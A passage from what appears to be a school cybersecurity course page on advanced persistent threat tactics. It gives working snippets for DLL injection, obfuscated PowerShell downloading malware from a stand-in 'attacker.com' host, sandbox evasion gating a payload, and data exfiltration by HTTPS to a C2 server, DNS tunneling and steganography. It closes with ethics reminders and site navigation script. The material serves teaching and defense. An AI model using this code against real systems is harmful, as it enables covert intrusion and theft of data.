<p><strong>Hide malicious code in legitimate process.</strong></p>
<p><strong>Techniques:</strong></p>
<pre><code class="language-c">// Classic DLL injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath), NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, pDllPath, 0, NULL);
</code></pre>
<p><strong>Process hollowing:</strong>
1. Create legitimate process in suspended state
2. Hollow out (unmap) its memory
3. Write malicious code
4. Resume execution</p>
<p><strong>Reflective DLL injection:</strong>
- Load DLL without using LoadLibrary
- Entirely in memory, no disk writes</p>
<h3 id="obfuscation">Obfuscation</h3>
<p><strong>PowerShell obfuscation:</strong></p>
<pre><code class="language-powershell"># Original
Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile malware.exe

# Obfuscated
$url='http://at'+'tacker.com/mal'+'ware.exe';
$out='mal'+'ware.exe';
.('I'+'nvoke-W'+'ebRequest') -Uri $url -OutFile $out

# Base64 encoded
powershell.exe -enc &lt;base64_encoded_command&gt;
</code></pre>
<p><strong>String encryption:</strong></p>
<pre><code class="language-python"># Encrypt strings in malware
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt C2 domain
c2_domain = &quot;attacker.com&quot;
encrypted = cipher.encrypt(c2_domain.encode())

# In malware: decrypt at runtime
decrypted = cipher.decrypt(encrypted)
</code></pre>
<h3 id="anti-analysis">Anti-Analysis</h3>
<p><strong>Detect VMs and sandboxes:</strong></p>
<pre><code class="language-python">import os
import subprocess

def is_virtualized():
    &quot;&quot;&quot;Check if running in VM&quot;&quot;&quot;

    # Check for VM artifacts
    vm_files = [
        'C:\\Windows\\System32\\drivers\\vmmouse.sys',
        'C:\\Windows\\System32\\drivers\\vmhgfs.sys',
        '/dev/vmware'
    ]

    for f in vm_files:
        if os.path.exists(f):
            return True

    # Check for sandbox behavior
    if os.getenv('USERNAME') == 'sandbox':
        return True

    # Check uptime (sandboxes often have short uptime)
    uptime = int(subprocess.check_output('echo $(($(date +%s) - $(date -d &quot;$(uptime -s)&quot; +%s)))', shell=True))
    if uptime &lt; 600:  # Less than 10 minutes
        return True

    return False

if is_virtualized():
    # Act benign or exit
    sys.exit(0)
else:
    # Execute malicious payload
    run_payload()
</code></pre>
<h2 id="data-exfiltration">Data Exfiltration</h2>
<h3 id="encrypted-channels">Encrypted Channels</h3>
<pre><code class="language-python">import requests
from cryptography.fernet import Fernet

def exfiltrate_data(data, c2_url, key):
    &quot;&quot;&quot;Exfiltrate encrypted data&quot;&quot;&quot;
    cipher = Fernet(key)
    encrypted = cipher.encrypt(data.encode())

    # Send over HTTPS (legitimate-looking traffic)
    response = requests.post(
        c2_url,
        data={'data': encrypted},
        headers={'User-Agent': 'Mozilla/5.0...'}
    )

    return response.status_code == 200
</code></pre>
<h3 id="dns-tunneling">DNS Tunneling</h3>
<pre><code class="language-python">import dns.resolver
import base64

def exfil_via_dns(data, domain):
    &quot;&quot;&quot;Exfiltrate data via DNS queries&quot;&quot;&quot;
    # Encode and chunk data
    encoded = base64.b32encode(data.encode()).decode()
    chunk_size = 63  # DNS label max length

    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        query = f&quot;{chunk}.{domain}&quot;

        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass  # Don't care about response
</code></pre>
<h3 id="steganography">Steganography</h3>
<pre><code class="language-python">from PIL import Image

def hide_data_in_image(image_path, data, output_path):
    &quot;&quot;&quot;Hide data in image LSB&quot;&quot;&quot;
    img = Image.open(image_path)
    encoded = img.copy()
    pixels = encoded.load()

    # Convert data to binary
    binary_data = ''.join(format(ord(c), '08b') for c in data)
    binary_data += '1111111111111110'  # End marker

    data_index = 0
    for y in range(img.size[1]):
        for x in range(img.size[0]):
            if data_index &lt; len(binary_data):
                pixel = list(pixels[x, y])
                # Modify LSB of red channel
                pixel[0] = (pixel[0] &amp; 0xFE) | int(binary_data[data_index])
                pixels[x, y] = tuple(pixel)
                data_index += 1
            else:
                break

    encoded.save(output_path)

# Use: Upload image to social media, C2 extracts data
</code></pre>
<h2 id="red-team-operations">Red Team Operations</h2>
<h3 id="operational-security-opsec">Operational Security (OPSEC)</h3>
<p><strong>Principles:</strong>
- Minimize footprint
- Blend in with normal traffic
- Rotate infrastructure
- Use legitimate services
- Clean up artifacts</p>
<p><strong>Tradecraft:</strong>
- Use encryption for all communications
- Separate testing and operational infrastructure
- Document everything (for report)
- Time operations appropriately
- Have rollback plans</p>
<h3 id="rules-of-engagement">Rules of Engagement</h3>
<p><strong>Typical ROE includes:</strong>
- Authorized scope (IP ranges, domains)
- Prohibited actions (DoS, data destruction)
- Time windows for testing
- Escalation procedures
- Communication protocols
- Data handling requirements</p>
<h3 id="post-engagement">Post-Engagement</h3>
<p><strong>Cleanup:</strong>
- Remove backdoors
- Delete implants
- Clean logs (carefully, document first)
- Remove accounts created
- Close network connections</p>
<p><strong>Reporting:</strong>
- Executive summary
- Technical findings
- Evidence (screenshots, logs)
- Risk ratings
- Remediation recommendations
- Timeline of activities</p>
<h2 id="key-takeaways">Key Takeaways</h2>
<p><strong>APT characteristics:</strong>
- Long-term, patient operations
- Sophisticated techniques
- Well-resourced
- Clear objectives
- Custom tooling</p>
<p><strong>Defensive lessons:</strong>
- Assume breach mentality
- Defense in depth essential
- Monitor for TTPs, not just IOCs
- Threat intelligence crucial
- Continuous improvement</p>
<p><strong>Ethical considerations:</strong>
- Always authorized testing only
- Respect scope limitations
- Document everything
- Report responsibly
- Clean up completely</p>
<p><strong>Remember:</strong>
- These techniques are powerful
- Use only with authorization
- Legal consequences for misuse
- Ethics matter
- Skills should protect, not harm</p>
<p>APT tactics represent the cutting edge of offensive security. Study them to better defend against real threats, practice in legal environments, and always use your skills ethically and responsibly.</p>
        

        <!-- Lesson Navigation (only show on non-homepage pages) -->
        
        <div class="lesson-nav">
            
            <a href="../lesson9-2/" class="lesson-nav-button">
                <span class="arrow">‚Üê</span>
                <span>Previous: Lesson 9.2</span>
            </a>
            

            <div class="lesson-nav-info">
                <div class="current-lesson">Current Lesson</div>
                <div class="lesson-title">Lesson 9.3</div>
            </div>

            
            <a href="../../unit10/lesson10-1/" class="lesson-nav-button">
                <span>Next: Lesson 10.1</span>
                <span class="arrow">‚Üí</span>
            </a>
            
        </div>
        
    </div>

    <footer>
        <p>NCHS Cybersecurity | Built with MkDocs</p>
        
        <p>Copyright &copy; 2025 Mohamed Morsy</p>
        
    </footer>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
    
    <script src="../../../search_index.js"></script>
    
    <script>
        function toggleMenu() {
            const navLinks = document.getElementById('navLinks');
            navLinks.classList.toggle('active');
        }

        document.addEventListener('DOMContentLoaded', function() {
            const unitHeaders = document.querySelectorAll('.nav-links .nested > strong');
            
            unitHeaders.forEach(header => {
                header.addEventListener('click', function(e) {
                    e.stopPropagation(); 
                    const parent = this.parentElement;
                    parent.classList.toggle('collapsed');
                });
            });
        });

        document.addEventListener('DOMContentLoaded', function() {
            const searchInput = document.getElementById('searchInput');
            const searchResults = document.getElementById('searchResults');
            
            if (!searchInput || !searchResults) {
                return;
            }
            
            let searchIndex = null;
            let useSimpleSearch = false;
            
            const simpleIndex = [
                
                    
                
                    
                        
                            
                                
                                {
                                    title: "Lesson 1.1",
                                    url: '../../unit1/lesson1-1/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.2",
                                    url: '../../unit1/lesson1-2/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.3",
                                    url: '../../unit1/lesson1-3/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.4",
                                    url: '../../unit1/lesson1-4/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.5",
                                    url: '../../unit1/lesson1-5/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.6",
                                    url: '../../unit1/lesson1-6/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Linux Installation Process",
                                    url: '../../unit1/installation-process/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 2.1",
                                    url: '../../unit2/lesson2-1/',
                                    path: 'Curriculum > Unit 2'
                                },
                                
                                {
                                    title: "Lesson 2.2",
                                    url: '../../unit2/lesson2-2/',
                                    path: 'Curriculum > Unit 2'
                                },
                                
                                {
                                    title: "Lesson 2.3",
                                    url: '../../unit2/lesson2-3/',
                                    path: 'Curriculum > Unit 2'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 3.1",
                                    url: '../../unit3/lesson3-1/',
                                    path: 'Curriculum > Unit 3'
                                },
                                
                                {
                                    title: "Lesson 3.2",
                                    url: '../../unit3/lesson3-2/',
                                    path: 'Curriculum > Unit 3'
                                },
                                
                                {
                                    title: "Lesson 3.3",
                                    url: '../../unit3/lesson3-3/',
                                    path: 'Curriculum > Unit 3'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 4.1",
                                    url: '../../unit4/lesson4-1/',
                                    path: 'Curriculum > Unit 4'
                                },
                                
                                {
                                    title: "Lesson 4.2",
                                    url: '../../unit4/lesson4-2/',
                                    path: 'Curriculum > Unit 4'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 5.1",
                                    url: '../../unit5/lesson5-1/',
                                    path: 'Curriculum > Unit 5'
                                },
                                
                                {
                                    title: "Lesson 5.2",
                                    url: '../../unit5/lesson5-2/',
                                    path: 'Curriculum > Unit 5'
                                },
                                
                                {
                                    title: "Lesson 5.3",
                                    url: '../../unit5/lesson5-3/',
                                    path: 'Curriculum > Unit 5'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 6.1",
                                    url: '../../unit6/lesson6-1/',
                                    path: 'Curriculum > Unit 6'
                                },
                                
                                {
                                    title: "Lesson 6.2",
                                    url: '../../unit6/lesson6-2/',
                                    path: 'Curriculum > Unit 6'
                                },
                                
                                {
                                    title: "Lesson 6.3",
                                    url: '../../unit6/lesson6-3/',
                                    path: 'Curriculum > Unit 6'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 7.1",
                                    url: '../../unit7/lesson7-1/',
                                    path: 'Curriculum > Unit 7'
                                },
                                
                                {
                                    title: "Lesson 7.2",
                                    url: '../../unit7/lesson7-2/',
                                    path: 'Curriculum > Unit 7'
                                },
                                
                                {
                                    title: "Lesson 7.3",
                                    url: '../../unit7/lesson7-3/',
                                    path: 'Curriculum > Unit 7'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 8.1",
                                    url: '../../unit8/lesson8-1/',
                                    path: 'Curriculum > Unit 8'
                                },
                                
                                {
                                    title: "Lesson 8.2",
                                    url: '../../unit8/lesson8-2/',
                                    path: 'Curriculum > Unit 8'
                                },
                                
                                {
                                    title: "Lesson 8.3",
                                    url: '../../unit8/lesson8-3/',
                                    path: 'Curriculum > Unit 8'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 9.1",
                                    url: '../lesson9-1/',
                                    path: 'Curriculum > Unit 9'
                                },
                                
                                {
                                    title: "Lesson 9.2",
                                    url: '../lesson9-2/',
                                    path: 'Curriculum > Unit 9'
                                },
                                
                                {
                                    title: "Lesson 9.3",
                                    url: './',
                                    path: 'Curriculum > Unit 9'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 10.1",
                                    url: '../../unit10/lesson10-1/',
                                    path: 'Curriculum > Unit 10'
                                },
                                
                                {
                                    title: "Lesson 10.2",
                                    url: '../../unit10/lesson10-2/',
                                    path: 'Curriculum > Unit 10'
                                },
                                
                                {
                                    title: "Lesson 10.3",
                                    url: '../../unit10/lesson10-3/',
                                    path: 'Curriculum > Unit 10'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 11.1",
                                    url: '../../unit11/lesson11-1/',
                                    path: 'Curriculum > Unit 11'
                                },
                                
                                {
                                    title: "Lesson 11.2",
                                    url: '../../unit11/lesson11-2/',
                                    path: 'Curriculum > Unit 11'
                                },
                                
                                {
                                    title: "Lesson 11.3",
                                    url: '../../unit11/lesson11-3/',
                                    path: 'Curriculum > Unit 11'
                                },
                                
                            
                        
                    
                
                    
                        {
                            title: "Terminal",
                            url: '../../../test/',
                            path: 'Main'
                        },
                    
                
            ];
            
            if (typeof window.searchIndex !== 'undefined') {
                searchIndex = window.searchIndex;
                useSimpleSearch = false;
                console.log('‚úì Using embedded search index:', searchIndex.docs.length, 'documents');
            } else {
                const base_url = document.querySelector('base')?.getAttribute('href') || '/';
                fetch(base_url + 'search_data.js')
                    .then(response => response.text())
                    .then(data => {
                        eval(data);  
                        if (window.searchIndex) {
                            searchIndex = window.searchIndex;
                            useSimpleSearch = false;
                            console.log('‚úì Loaded search index from JS:', searchIndex.docs.length, 'documents');
                        }
                    })
                    .catch(() => {
                        console.log('Using simple title search (full search not available)');
                        useSimpleSearch = true;
                    });
                
                useSimpleSearch = true; 
            }
            
            function performSearch(query) {
                if (!query || query.length < 2) {
                    searchResults.classList.remove('active');
                    return;
                }
                
                if (useSimpleSearch || !searchIndex) {
                    performSimpleSearch(query);
                } else {
                    performFullSearch(query);
                }
            }
            
            function performSimpleSearch(query) {
                const lowerQuery = query.toLowerCase();
                const results = simpleIndex.filter(item => 
                    item.title.toLowerCase().includes(lowerQuery)
                );
                displaySimpleResults(results, query);
            }
            
            function performFullSearch(query) {
                const lowerQuery = query.toLowerCase();
                const queryTerms = lowerQuery.split(/\s+/);
                
                const results = searchIndex.docs
                    .map(doc => {
                        let score = 0;
                        let matchedText = '';
                        
                        if (doc.title && doc.title.toLowerCase().includes(lowerQuery)) {
                            score += 10;
                        }
                        
                        if (doc.text) {
                            const text = doc.text.toLowerCase();
                            queryTerms.forEach(term => {
                                if (term.length < 2) return;
                                const count = (text.match(new RegExp(escapeRegex(term), 'g')) || []).length;
                                score += count;
                                
                                if (count > 0 && !matchedText) {
                                    const index = text.indexOf(term);
                                    const start = Math.max(0, index - 50);
                                    const end = Math.min(text.length, index + term.length + 50);
                                    matchedText = doc.text.substring(start, end);
                                    if (start > 0) matchedText = '...' + matchedText;
                                    if (end < text.length) matchedText = matchedText + '...';
                                }
                            });
                        }
                        
                        return {
                            title: doc.title,
                            location: doc.location,
                            text: matchedText || (doc.text ? doc.text.substring(0, 150) + '...' : ''),
                            score: score
                        };
                    })
                    .filter(result => result.score > 0)
                    .sort((a, b) => b.score - a.score);
                
                displayFullResults(results, query);
            }
            
            function displaySimpleResults(results, query) {
                if (results.length === 0) {
                    searchResults.innerHTML = '<div class="search-no-results">No results found</div>';
                    searchResults.classList.add('active');
                    return;
                }
                
                const html = results.slice(0, 10).map(result => {
                    const highlightedTitle = highlightText(result.title, query);
                    return `
                        <a href="${result.url}" class="search-result-item">
                            <div class="search-result-title">${highlightedTitle}</div>
                            <div class="search-result-path">${escapeHtml(result.path)}</div>
                        </a>
                    `;
                }).join('');
                
                searchResults.innerHTML = html;
                searchResults.classList.add('active');
            }
            
            function displayFullResults(results, query) {
                if (results.length === 0) {
                    searchResults.innerHTML = '<div class="search-no-results">No results found</div>';
                    searchResults.classList.add('active');
                    return;
                }
                
                const pathname = window.location.pathname;
                let basePath = '/';
                
                const pathParts = pathname.split('/').filter(p => p);
                
                if (pathParts.length > 0 && !pathParts[0].endsWith('.html')) {
                    const firstPart = pathParts[0];
                    if (firstPart !== 'index' && firstPart !== 'search') {
                        basePath = '/' + firstPart + '/';
                    }
                }
                
                console.log('Current pathname:', pathname);
                console.log('Detected base path:', basePath);
                
                const html = results.slice(0, 10).map(result => {
                    const highlightedTitle = highlightText(result.title, query);
                    const highlightedText = highlightText(result.text, query);
                    
                    let path = result.location.replace(/^\//, '').replace(/\.html$/, '').replace(/\//g, ' > ');
                    if (!path) path = 'Home';
                    
                    let url;
                    if (basePath === '/') {
                        url = result.location;
                    } else {
                        const cleanLocation = result.location.startsWith('/') ? result.location.substring(1) : result.location;
                        url = basePath + cleanLocation;
                    }
                    
                    console.log('Result:', result.title, '-> URL:', url);
                    
                    return `
                        <a href="${url}" class="search-result-item">
                            <div class="search-result-title">${highlightedTitle}</div>
                            <div class="search-result-path">${escapeHtml(path)}</div>
                            <div class="search-result-excerpt">${highlightedText}</div>
                        </a>
                    `;
                }).join('');
                
                searchResults.innerHTML = html;
                searchResults.classList.add('active');
            }
            
            function highlightText(text, query) {
                if (!text) return '';
                const queryTerms = query.split(/\s+/).filter(t => t.length >= 2);
                let result = escapeHtml(text);
                queryTerms.forEach(term => {
                    const regex = new RegExp('(' + escapeRegex(term) + ')', 'gi');
                    result = result.replace(regex, '<span class="search-highlight">$1</span>');
                });
                return result;
            }
            
            function escapeRegex(string) {
                return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            }
            
            function escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            }
            
            let searchTimeout;
            searchInput.addEventListener('input', function(e) {
                clearTimeout(searchTimeout);
                searchTimeout = setTimeout(() => performSearch(e.target.value), 300);
            });
            
            searchInput.addEventListener('focus', function(e) {
                if (e.target.value.length >= 2) {
                    performSearch(e.target.value);
                }
            });
            
            document.addEventListener('click', function(e) {
                if (!searchInput.contains(e.target) && !searchResults.contains(e.target)) {
                    searchResults.classList.remove('active');
                }
            });
            
            searchInput.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    searchResults.classList.remove('active');
                    searchInput.blur();
                }
            });
        });

        
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('pre code').forEach((block) => {
                block.parentElement.style.position = 'relative';
            });
        });
        
    </script>
</body>
</html>